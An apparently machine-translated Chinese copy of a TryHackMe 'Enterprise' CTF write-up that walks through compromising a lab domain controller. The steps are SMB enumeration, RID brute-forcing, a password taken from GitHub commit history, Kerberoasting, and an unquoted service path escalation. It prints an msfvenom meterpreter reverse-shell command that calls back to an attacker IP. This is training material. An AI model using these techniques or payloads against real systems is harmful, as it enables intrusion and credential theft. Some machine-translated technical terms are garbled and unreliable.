<html>
<head>
<title>Enterprise — Tryhackme Writeup</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">企业— Tryhackme报道</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/enterprise-tryhackme-writeup-aee8691afa17?source=collection_archive---------1-----------------------#2022-11-05">https://infosecwriteups.com/enterprise-tryhackme-writeup-aee8691afa17?source=collection_archive---------1-----------------------#2022-11-05</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="5024" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你刚刚登陆了一个内部网络。你扫描网络，只有域控制器</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/1eeb1794a9bbd51c4254639415d4623b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*B-YgfwR0Zllf3sR8CmNtVA.png"/></div></div></figure><h1 id="0a88" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">✅信息收集</h1><h2 id="66d8" class="lv ky iq bd kz lw lx dn ld ly lz dp lh jy ma mb ll kc mc md lp kg me mf lt mg bi translated">鲁斯坎</h2><p id="4295" class="pw-post-body-paragraph jn jo iq jp b jq mh js jt ju mi jw jx jy mj ka kb kc mk ke kf kg ml ki kj kk ij bi translated">第一，用rustscan找开放端口很好！！你知道为什么！！它可以在不到10秒的时间内扫描范围从0到65535的所有端口！！</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mm"><img src="../Images/44fb8b9f8c7450779c9cc2c1a0f62d64.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*w8_8L61J_zLTWrEIN5LfGQ.png"/></div></div></figure><p id="4cb8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以看到我们打开了几个端口，包括88个用于Kerberos身份验证的端口。所以，很可能是域控制器。</p><p id="425c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在让我们试着运行NMAP，以获得更多的细节，比如来自LDAP的域名和服务版本！！</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mn"><img src="../Images/5d0d701b75e997be20bf0adb568a15fb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*L--il6V8xmIo-0owPYaxow.png"/></div></div></figure><p id="d6c3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如你所见，我们从RDP端口(3389)即LAB获得了域名。企业. THM</p><p id="8eda" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在首先让我们把这个域名添加到我们的<code class="fe mo mp mq mr b">/etc/hosts</code></p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ms"><img src="../Images/7d24b17d9775b192a0dbf3272bd0aecd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RJQrJWW1a9teN2N3udkssw.png"/></div></div></figure><h1 id="f4a9" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">✅ SMB端口枚举(445)</h1><p id="a115" class="pw-post-body-paragraph jn jo iq jp b jq mh js jt ju mi jw jx jy mj ka kb kc mk ke kf kg ml ki kj kk ij bi translated">首先，我喜欢列举SMB端口。让我们首先尝试用空会话列出这些股份。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mt"><img src="../Images/6fd42de1fb7dd08db12001f1ce4698d6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yPRguvUKAIJvMHy4_aVIwQ.png"/></div></div></figure><p id="906c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正如您所看到的，我们已经读取了IPC$ so上的<strong class="jp ir"> </strong>权限，我们可以使用impacket-lookup id来查找可能的用户名。但是现在，让我们继续列举。</p><p id="2bdd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">既然我们对<strong class="jp ir">用户</strong>和<strong class="jp ir">文档</strong>拥有读取权限，那么让我们将它们转储到我的机器上。更有效地列举。</p><p id="4f6f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，对于转储股份，我可以使用CIFS(通用互联网文件系统)或crackmapexec来抓取股份，如下所示:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mu"><img src="../Images/f02023e58d9e3601317b66b5b85006bd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1nfuB9VNsfrACBW_f9932A.png"/></div></div></figure><p id="bedb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它会将结果存储在<code class="fe mo mp mq mr b">/tmp/cme_spider_plus</code>中:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi mv"><img src="../Images/9d528f68bd4601563d83c07582c2fbe9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1338/format:webp/1*7ievxE95PzP0YOnT60OaSQ.png"/></div></figure><p id="e5d7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在让我们运行<code class="fe mo mp mq mr b">tree</code>命令，我们可以直观地看到突出的文件:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mw"><img src="../Images/6a3ac6c6e985429b7962bfb33abaf1a7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NYBa4ruxm8qHho40zaUQWQ.png"/></div></div></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mx"><img src="../Images/907d951f423af830c4a59ea6a8d72adc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uOhrup3PBUVHDhFXb07t_A.png"/></div></div></figure><p id="cd3b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，有三个文件很突出，其中两个是文档文件，它似乎是加密的(如果走进死胡同，我们将回到这里)，另一个是Consolehost_history.txt文件。这是记录PowerShell命令历史的默认文件。让我们看看它的内容！！</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi my"><img src="../Images/165a78cb3525b02b9b621f62062ecf07.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qwlOZEk9vpTUp2dFT7_O0A.png"/></div></div></figure><p id="a29c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以看到用户名和密码，让我们尝试使用这些凭据。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mz"><img src="../Images/d92329263f7c4c6a2f913838a77657a5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*A1gDHbRSW12ZRNCB6hvUJA.png"/></div></div></figure><p id="2108" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是我们可以看到登录失败了！！我也尝试了不同的协议，我们得到了一个登录失败。</p><p id="83db" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我想到了密码喷涂，但首先，我们需要得到所有的用户名。</p><h1 id="6aad" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">AD中的✅用户名枚举</h1><p id="d2c8" class="pw-post-body-paragraph jn jo iq jp b jq mh js jt ju mi jw jx jy mj ka kb kc mk ke kf kg ml ki kj kk ij bi translated">因为我们在IPC$上有读权限，所以我们可以通过使用crackmapexec或<code class="fe mo mp mq mr b">impacket-lookupsid.py</code>来枚举用户。现在，我将使用<code class="fe mo mp mq mr b">impacket-lookupsid.py</code></p><p id="da08" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这里，我们实际上是通过强制RID(相对标识符)来枚举的</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi na"><img src="../Images/8c1ac8c00a0934f0b6f1308c5344c014.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DiZ_PeR2ZS6K4bJ3dPZawQ.png"/></div></div></figure><p id="0d64" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这里，我们将获得所有用户，让我们通过正确格式化来创建一个用户名. txt文件。<code class="fe mo mp mq mr b">impacket-lookupsid 'anonymous:'@&lt;ip&gt; | cut -d " " -f 2 &gt; usernames.txt</code></p><p id="c3e2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">此外，删除不必要的帐户！！</p><p id="2ea4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我们有一个用户名列表。现在让我们试着把它和我们在控制台历史文件中找到的密码进行对比。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nb"><img src="../Images/46b8b7f6561c9e76a87a4ef012b6d4a5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hTf8DM0orwTJFJKWUw0PNg.png"/></div></div></figure><p id="dbc6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如你所见，我们有<code class="fe mo mp mq mr b">STATUS_LOGON_FAILURE</code>东西。</p><h1 id="2759" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">✅枚举端口80</h1><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nc"><img src="../Images/6cd6c7e4c519e8d6b54f5592ed92bb0e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*TeGUGFyjPQvWJcdykvnh2g.png"/></div></div></figure><p id="590e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这里，我试图蛮力目录，但没有出现接受机器人。txt，这是值得检查！！</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nd"><img src="../Images/d95bf69bba201e208cf2c1a2be87e179.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7uovLcV6BbvZhQvSGLDVaw.png"/></div></div></figure><p id="f0c4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是我们什么都没得到！！</p><p id="057d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这更可能是一个死胡同，所以，我开始破解这些文档文件，并再次开始枚举过程。但是还是没有任何进展</p><p id="f48d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">等待一段时间后，我发现有一个端口显示在我们的RUSTSCAN结果中，但没有显示在我们的Nmap结果中，即<strong class="jp ir"> 7990。</strong></p><p id="89c4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我启动了Nmap来对抗它！！</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ne"><img src="../Images/f7ca4d7f8efe9c284c11d54553f3c6ea.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2nWV-gYMqlKuWr4NJ5hS9Q.png"/></div></div></figure><p id="6868" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它运行的是微软的IIS服务器。我们来列举一下吧！！</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nf"><img src="../Images/09dcb876e9448bda1cb90666e958e94f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*etfPh4BUMRstGrsLzbTetQ.png"/></div></div></figure><p id="405e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">首先，我试着输入我通过电子邮件获得的信用</p><p id="86c9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我尝试了网络目录暴力和其他一些枚举，但没有什么真正出现。</p><p id="0928" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是在登录页面的顶部，写着我们正在迁移到GitHub。</p><p id="b954" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我们搜索一下GitHub for LABS.Enterprise.thm。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ng"><img src="../Images/c2b72d3dab9529130550dfc7ff0089c3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0k87Gz_JtwPVm3dqUFUFRw.png"/></div></div></figure><p id="b432" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这里除了一个关于我们的文件之外什么都没有，但是我们找到了一个用户</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nh"><img src="../Images/6f84b4ef0427e8532116d0add499eca9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tJyUHEQqXBSBvFaLvJI6KA.png"/></div></div></figure><p id="57dc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">他的名字是Nik-enterprise-dev，如果我们继续查看他的个人资料，我们会得到一些管理脚本，但没有任何有用的东西。但是如果我们看到提交完成，我们会发现一些非常有趣的事情。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ni"><img src="../Images/0b8398288eeb58e95e02d45bbb25a247.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Vu105rUx6eyGLygopvwocA.png"/></div></div></figure><p id="a47d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以最后我们拿到了第一张凭证，<strong class="jp ir"> nik: ToastyBoi！。</strong>我们现在可以验证凭据了:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nj"><img src="../Images/8a77588f5d689a64631179187be01366.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oh2iLvm-5aDEb9SyzWy3vw.png"/></div></div></figure><p id="1fe7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">事实上，它们是有效的凭证！！</p><p id="e9cc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在让我们搜索那里的任何kerberostable用户，并用impacket转储他们的散列。</p><h1 id="f05f" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">✅寻找Kerberos稳定的用户</h1><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nk"><img src="../Images/97227b69c96377a2362741750d75df43.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NMAWGDYF6m1uQqI6_NfbtA.png"/></div></div></figure><p id="342f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">好了，我们得到了一个启用了Kerberos身份验证的用户帐户；所以我们可以扔掉他们的大麻。</p><p id="4892" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们试着用hashcat来破解它们:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nl"><img src="../Images/81968bd7e80bd857520763f5792f0d32.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*IkC_7XEOFTQv8hMUbsgS_A.png"/></div></div></figure><h1 id="64c3" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">✅最初的立足点</h1><p id="bfff" class="pw-post-body-paragraph jn jo iq jp b jq mh js jt ju mi jw jx jy mj ka kb kc mk ke kf kg ml ki kj kk ij bi translated">获得两个有效凭证后；我再次开始枚举过程，但这次我想，我们先获取访问权限。我试图使用<code class="fe mo mp mq mr b">evil-winrm</code>,但它不起作用，因为没有为这些帐户配置Psremoting。但是从我们的NMAP结果来看，我们记得RDP在跑步。我试着用两个用户凭证访问RDP，其中一个用户凭证(bitbucket)有RDP权限。</p><p id="7e55" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">登录后，我们得到了<code class="fe mo mp mq mr b">user.txt</code>文件。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi nm"><img src="../Images/2778586571603c6e7c105894969f3ff5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1380/format:webp/1*9Q-tuQps0Gwkt6otvs3esA.png"/></div></figure><p id="7413" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，因为我们只在DC(域控制器)上。我们需要提升我们的特权。</p><h1 id="c236" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">✅权限升级</h1><p id="1ff1" class="pw-post-body-paragraph jn jo iq jp b jq mh js jt ju mi jw jx jy mj ka kb kc mk ke kf kg ml ki kj kk ij bi translated">首先，让我们获得meterpreter reverse shell，以便我们可以轻松地处理后利用和权限提升。</p><p id="638a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在获得第一次访问权后，简单地转移有效载荷配置为<code class="fe mo mp mq mr b">windows/x64/meterpreter/reverse_tcp</code>的漏洞，我试图运行<strong class="jp ir">本地漏洞利用建议器</strong>来找到任何可以使用的漏洞利用！！</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nk"><img src="../Images/529a07e5dce45e546d11cdffd9db2a61.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_v4A-F73rCbKHcTd7u_mgA.png"/></div></div></figure><p id="bf30" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">是的，我们得到了一些建议，在尝试之后，我只得到一个错误<code class="fe mo mp mq mr b">exploit completed but no session created</code>，这是令人难过的！！</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi nn"><img src="../Images/fa9288d229c23cc2882be6587f3b1faa.png" data-original-src="https://miro.medium.com/v2/resize:fit:996/1*l7RQMcaErVMrYQ26CcZcXA.gif"/></div></figure><p id="fa47" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，我想到了转移<strong class="jp ir">winpeas.exe</strong>去寻找一个更有特权的升级载体。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi no"><img src="../Images/9a5a97e85fa7cd9ede0878dcca75f005.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*emIcFmUxh0E47O53hJuqQw.png"/></div></div></figure><p id="d7a7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">是的，有一个<strong class="jp ir">未引用的服务路径注入漏洞</strong>，我们可以利用它。</p><p id="ddc0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我创建了一个msfvenom漏洞:</p><pre class="km kn ko kp gt np mr nq nr aw ns bi"><span id="cbc1" class="lv ky iq mr b gy nt nu l nv nw">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.17.0.110 LPORT=4443 -f exe -o ZeroTier.exe</span></pre><p id="c588" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">并将其转移到路径<code class="fe mo mp mq mr b">c:\Program Files (x86)\Zero Tier\Zero Tier One</code></p><p id="2a81" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">名称为<code class="fe mo mp mq mr b">ZeroTier.exe</code>，这将允许我们利用未加引号的服务名称路径。</p><p id="44af" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在让我们用Powershell启动服务</p><pre class="km kn ko kp gt np mr nq nr aw ns bi"><span id="14a9" class="lv ky iq mr b gy nt nu l nv nw">Start-Service zerotieroneservice</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="ab gu cl nx"><img src="../Images/9e3e18bb0f070aad298399a82ad86615.png" data-original-src="https://miro.medium.com/v2/format:webp/1*XXv66kHqw_dhBOg9Cptj1g.png"/></div></figure><p id="56f5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们得到了壳，但是在得到壳4-5次之后，它每次都在死亡，所以；我认为我们需要将其迁移到一个稳定的流程中。我们可以将Metasploit的后开发模块与is <code class="fe mo mp mq mr b">windows/manage/migrate </code>一起使用。通过使用它，我们可以迁移到更稳定的流程。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ny"><img src="../Images/80e41588b4f888db0fffc3accd954e00.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Y0oG6iRbrLSbSvcwOElF-Q.png"/></div></div></figure><p id="f0e7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们有了一个稳定的管理员外壳</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nz"><img src="../Images/0df77ce158113a3da914d674c6bb3a77.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7LMp4IDKMWUv8pnpkfzLXw.png"/></div></div></figure><p id="13ce" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">是的，最后我们得到了root.txt文件！！</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi nn"><img src="../Images/9df503fd6c43ac582b1d38c21fb1ed45.png" data-original-src="https://miro.medium.com/v2/resize:fit:996/1*SEpl9H5MuKWZrXHsuxLymQ.gif"/></div></figure><p id="fa68" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">谢谢你看我的文章！！👊👊</p><p id="8708" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">请在媒体和其他社交平台上关注我，支持我:</p><p id="eb99" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae oa" href="https://surya-dev.medium.com/" rel="noopener">https://surya-dev.medium.com/</a></p><p id="9e58" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae oa" href="https://twitter.com/kryolite_secure" rel="noopener ugc nofollow" target="_blank">https://twitter.com/kryolite_secure</a>/</p><p id="e874" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">https://<a class="ae oa" href="http://www.instagram.com/kryolite_security/" rel="noopener ugc nofollow" target="_blank">www.instagram.com/kryolite_security/</a></p><p id="7281" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae oa" href="https://github.com/surya-dev-singh/" rel="noopener ugc nofollow" target="_blank">https://github.com/surya-dev-singh/</a></p><p id="b632" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你们可以订阅我🙌在YouTube上:<strong class="jp ir">我在那里发布演练和其他道德黑客相关的视频。</strong></p><div class="ob oc gp gr od oe"><a href="https://www.youtube.com/channel/UCNKXlqfPevPg2Cv1R5YZ6Jw" rel="noopener  ugc nofollow" target="_blank"><div class="of ab fo"><div class="og ab oh cl cj oi"><h2 class="bd ir gy z fp oj fr fs ok fu fw ip bi translated">Kryolite安全公司</h2><div class="ol l"><h3 class="bd b gy z fp oj fr fs ok fu fw dk translated">你好世界！在Kryolite Security上，你可以找到关于道德黑客、网络安全、渗透测试、CTFs的视频…</h3></div><div class="om l"><p class="bd b dl z fp oj fr fs ok fu fw dk translated">www.youtube.com</p></div></div><div class="on l"><div class="oo l op oq or on os kv oe"/></div></div></a></div><div class="ob oc gp gr od oe"><a href="https://systemweakness.com/dark-web-introduction-8d965a8e68e2" rel="noopener  ugc nofollow" target="_blank"><div class="of ab fo"><div class="og ab oh cl cj oi"><h2 class="bd ir gy z fp oj fr fs ok fu fw ip bi translated">黑暗之网游戏攻略</h2><div class="ol l"><h3 class="bd b gy z fp oj fr fs ok fu fw dk translated">这将是黑暗网络纪录片系列的第一篇博客</h3></div><div class="om l"><p class="bd b dl z fp oj fr fs ok fu fw dk translated">systemweakness.com</p></div></div><div class="on l"><div class="ot l op oq or on os kv oe"/></div></div></a></div><div class="ob oc gp gr od oe"><a rel="noopener  ugc nofollow" target="_blank" href="/bitb-browser-in-the-browser-attack-e2008c405701"><div class="of ab fo"><div class="og ab oh cl cj oi"><h2 class="bd ir gy z fp oj fr fs ok fu fw ip bi translated">BITB(浏览器中的浏览器)攻击</h2><div class="ol l"><h3 class="bd b gy z fp oj fr fs ok fu fw dk translated">使用BITB攻击使网络钓鱼几乎不可检测！！</h3></div><div class="om l"><p class="bd b dl z fp oj fr fs ok fu fw dk translated">infosecwriteups.com</p></div></div><div class="on l"><div class="ou l op oq or on os kv oe"/></div></div></a></div><div class="ob oc gp gr od oe"><a href="https://systemweakness.com/attacktive-directory-tryhackme-90465c2d48ea" rel="noopener  ugc nofollow" target="_blank"><div class="of ab fo"><div class="og ab oh cl cj oi"><h2 class="bd ir gy z fp oj fr fs ok fu fw ip bi translated">攻击目录—利用易受攻击的域控制器[TryHackMe]</h2><div class="ol l"><h3 class="bd b gy z fp oj fr fs ok fu fw dk translated">99%的企业网络使用AD。但是您能利用易受攻击的域控制器吗？</h3></div><div class="om l"><p class="bd b dl z fp oj fr fs ok fu fw dk translated">systemweakness.com</p></div></div><div class="on l"><div 